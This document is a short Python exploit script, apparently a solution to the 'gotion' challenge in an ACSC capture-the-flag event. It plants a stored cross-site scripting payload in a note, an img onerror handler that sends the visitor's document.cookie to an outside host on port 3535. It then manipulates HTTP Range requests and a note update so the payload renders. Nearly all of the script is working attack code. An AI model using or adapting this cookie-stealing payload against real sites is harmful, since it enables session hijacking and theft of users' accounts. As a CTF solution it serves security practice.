import requests
import string
import os

# host = "http://localhost:30080"
host = "http://gotion.chal.ctf.acsc.asia"
# host = "http://gotion-2.chal.ctf.acsc.asia:30080"
pl = 'img onerror=location.assign(`//s.maple3142.net:3535/?${document.cookie}`) src=x:'.ljust(87, ' ')
path = requests.post(
    f"{host}/new-note",
    data={
        "title": "mp4".rjust(20, 'x'),
        "body": 'x' * (1024 - len(pl)) + pl,
    },
    allow_redirects=False,
).headers["Location"]
print(path)
note_id = path.split("/")[-1]
print(note_id)

r = requests.get(f"{host}{path}", headers={"Range": "bytes=4096-"})
print(r.headers)
print(r.text)

requests.post(
    f"{host}/update-note",
    data={
        "noteId": note_id,
        "title": "mp4",
        "body": "y" * 946,
    },
    allow_redirects=False,
)

r = requests.get(f"{host}{path}", headers={"Range": "bytes=-4095"})
print(r.headers)
print(r.text)

r = requests.get(f"{host}{path}")
print(r.headers)
print(r.text)

print(f"{host}{path}")